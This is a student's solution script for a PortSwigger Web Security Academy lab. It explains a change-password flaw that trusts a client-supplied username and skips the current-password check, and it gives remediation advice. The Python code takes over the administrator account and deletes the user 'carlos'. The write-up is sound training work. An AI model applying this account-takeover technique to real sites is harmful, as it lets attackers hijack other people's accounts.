"""
Tristan Gomez - CS 595
Spring 2021

The code below solves the PortSwigger level: Weak isolation on dual-use endpoint

Level Description:
    This lab makes a flawed assumption about the user's privilege level based on their input. 
    As a result, you can exploit the logic of its account management features to gain access 
    to arbitrary users' accounts. To solve the lab, access the administrator account and delete Carlos.

    You can log in to your own account using the following credentials: wiener:peter 


Vulnerability Description:
    The vulnerability in this lab is that the change password form for a logged in user doesn't 
    properly validate one field and it gives a client control over another field. The form does not
    properly validate the "current-password" field. If a client sends a POST request without the "current-
    password" field the site will still process the request. The second part of the vulnerability is that
    a client controls the "username" form field. This field isn't validated to check if the client who
    sent the request is the client whos password is being updated. As a result, I can omit the "current-
    password" field, and change the "username" field to be "administrator". Then I can change the admin's
    password to whatever I want, allowing me to login in as the administrator and solve the level.

Remediation:
    There are two main steps for remediation, both of which involve proper form validation. The site's 
    back-end should not process form submissions with missing fields. Next, the site shouldn't give control
    over the "username" field to the client. The form should use some per-user token that is given upon successful
    login by a client. In this way, the custom token is sent to the back-end which is then used to determine
    which user is changing their password. In this way, no client could guess/use another client's token.

"""

"""
    I am importing 'requests' so I can send GET and POST requests.
    I am importing 'BeautifulSoup' so that I can extract csrf tokens to use in form submissions.
"""
import requests
from bs4 import BeautifulSoup

s = requests.Session()
site = "ace51f0a1e00141480f24b12002f0092.web-security-academy.net"
login_url = f"https://{site}/login"
account_url = f"https://{site}/my-account"
password_change_url = f"https://{site}/my-account/change-password"


"""
    First, I am sending a GET request for the /login page so that I can extract the
    csrf token for the login form. Once I have extracted the token, I will package up
    the csrf token and the given credentials for the lab into a login_data object to be 
    used for logging in.
"""
resp = s.get(login_url)
soup = BeautifulSoup(resp.text,'html.parser')
csrf = soup.find('input', {'name':'csrf'}).get('value')

login_data = {
    'csrf': csrf,
    'username' : 'wiener',
    'password' : 'peter'
}

resp = s.post(login_url, data=login_data)
print(f"login status: {resp.status_code}")


"""
    After I have logged in, I will send a GET request for the /my-account page so I can
    extract the csrf token for the password change form. When the csrf token is extracted
    I will package it up into a passwordChangePayload object. In this object, I will set
    the 'username' field to 'administrator', and the new-password-1&2 fields to 'password'.
"""
resp = s.get(account_url)
soup = BeautifulSoup(resp.text,'html.parser')
csrf = soup.find('input', {'name':'csrf'}).get('value')

passwordChangePayload = {
    'csrf' : csrf,
    'username' : 'administrator',
    'new-password-1' : 'password',
    'new-password-2' : 'password'
}


"""
    I will post the passwordChangePayload to the password change form to change the administrator's 
    password. Then I will log out of my account so I can log into the admin account later.
"""
resp = s.post(password_change_url, data=passwordChangePayload)
print(f"password change status: {resp.status_code}")

resp = s.get(f"https://{site}/logout")
print(f"logout status {resp.status_code}")


"""
    After logging out, I will send a GET request for the login page to extract
    the csrf token. Once the token is extracted, I will send a POST request to the
    login page with the username 'administrator' and the password 'password'(which I 
    just changed in the previous step.)
"""
resp = s.get(login_url)
soup = BeautifulSoup(resp.text,'html.parser')
csrf = soup.find('input', {'name':'csrf'}).get('value')

login_data = {
    'csrf': csrf,
    'username' : 'administrator',
    'password' : 'password'
}

resp = s.post(login_url, data=login_data)
print(f"login as administrator status: {resp.status_code}")

"""
    Once I have logged in as the administrator, I will send a GET request for the admin page.
    Then I will send a GET request to the delete user "carlos" link to solve the level. 
"""

resp = s.get(f"https://{site}/admin")
print(f"Got to admin page with status of: {resp.status_code}")

resp = s.get(f"https://{site}/admin/delete?username=carlos")
print(f"Attempted to delete carlos' profile. Received status of: {resp.status_code}")